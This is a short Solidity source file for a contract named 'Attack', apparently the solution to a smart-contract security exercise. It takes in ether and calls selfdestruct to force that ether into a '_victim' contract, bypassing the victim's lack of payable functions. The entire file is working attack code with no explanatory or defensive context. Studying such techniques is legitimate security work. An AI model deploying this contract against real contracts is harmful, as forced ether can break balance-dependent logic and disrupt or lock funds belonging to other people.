// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

contract Attack{

    receive() external payable {}

    function disctruct(address payable _victim) public{
        selfdestruct(_victim);
    }
}